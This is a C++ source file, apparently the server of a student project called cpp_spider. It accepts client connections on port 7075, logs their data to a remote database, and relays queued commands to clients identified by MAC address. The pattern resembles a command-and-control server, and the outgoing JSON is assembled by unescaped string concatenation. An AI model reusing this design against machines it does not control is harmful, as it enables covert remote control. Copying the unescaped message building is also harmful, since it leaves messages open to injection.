/*
** Spider.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/server/src/Spider/Spider/Spider.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 19:45:20 2017 Gauthier Cler
** Last update Sun Oct 08 19:45:20 2017 Gauthier Cler
*/

#include <iostream>
#include <boost/property_tree/json_parser.hpp>
#include "Spider.hpp"

void Spider::Spider::run()
{
  _networkManager.setDataCallback([&](std::string &&data, ::Spider::Network::Client::instance client) { handleData(std::move(data), client); });
  _networkManager.start(7075);
}

void Spider::Spider::handleData(std::string &&data, ::Spider::Network::Client::instance client) {
  ::Spider::EnumParser type = _parser.run(data);

  if (type == ::Spider::EnumParser::ERROR && data != "\n")
    std::cerr << "[ERROR][SPIDER] Invalid command. Skipping" << std::endl;
  else if (type == ::Spider::EnumParser::OTHER)
    std::clog << "[WARNING][SPIDER] Command not implemented." << std::endl;
  else if (data != "\n") {
    std::shared_ptr<::Spider::Commands::ICommand> command = _commandManager.get(type);

    command->run(data, client, _dbManager);
  }
}

Spider::Spider::Spider() :
  _dbManager("teledor.fr", 28015, "spider")
{
  _dbManager.registerCollection("logs");
  _dbManager.registerCollection("clients");
  _dbManager.registerCollection("commands");
  _dbManager.registerCollection("responses");
  _dbManager["commands"].get()->subscribe([this](const std::string &result){
    boost::property_tree::ptree json;
    std::stringstream stream;
    stream << result;
    boost::property_tree::read_json(stream, json);
    if (json.get<std::string>("old_val") == "null") {
      if (_networkManager.send(json.get<std::string>("new_val.client_mac"),
			   R"({ "data": ")"
			   + json.get<std::string>("new_val.data")
			   + R"(", "type": ")"
			   + json.get<std::string>("new_val.type") + "\" }"))
	_dbManager["commands"].get()->remove(json.get<std::string>("new_val.id"));
    }
  });
}
